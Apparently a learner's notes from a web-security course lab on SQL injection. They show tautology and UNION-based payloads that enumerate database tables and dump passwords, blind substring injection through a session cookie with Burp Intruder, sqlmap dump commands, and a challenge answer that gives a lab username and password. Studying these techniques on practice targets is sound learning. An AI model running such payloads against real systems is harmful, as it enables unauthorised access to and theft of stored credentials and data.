```
jeremy' or 1=1#

will always be true so returns all rows
# - termintator symbol, indicates end of statement
```

## union 
```
jeremy' union select null,null....#

jeremy' union select null,null,version()#

jeremy' union select null,null,table_name from information_schema.tables#
jeremy' union select null,null,column_name from information_schema.columns#

jeremy' union select null,null,password from injection0x01#
```

if the column has other data types, it could return error
try  null(int) etc.

https://portswigger.net/web-security/sql-inection/cheat-sheet


# 0x02

use burpsuite to capture the traffic of login
send it to repeater

note the content-length to differentiate between valid logins

sending an or payload doesnt work
copy request, save to req.txt

```
sqlmap -r req.txt
```

sql injection on the cookie

```
Cookie: session=test' or 1=1#
```

## substring

```
test' or substring((select version()),1,1) = '8'#

repeat till we find version

we now have the version
test' or substring((select version()),1,5) = '8.0.3'#
```

send to intruder 
```
Cookie: session=test' or substring((select password from injection0x01 where username='jessamy'),1,1) = '§j§'#
```

set payload to a-z and numbers

![[Pasted image 20240801200812.png]]

```
sqlmap -r req.txt --level=2
```

![[Pasted image 20240801201243.png]]

```
sqlmap -r req.txt --level=2 --dump
```

```
sqlmap -r req.txt --level=2 --dump -T injection0x02
```


# challenge

Tanjyoubi Sushi Rack' union select null,null,null,null#or union

4 columns

```
Tanjyoubi Sushi Rack' union select null,null,null,username from injection0x03_users#

Tanjyoubi Sushi Rack' union select null,null,null,password from injection0x03_users#
```

username:
takeshi
password:
onigirigadaisuki

you could also use sqlmap and get the request from burpsuite

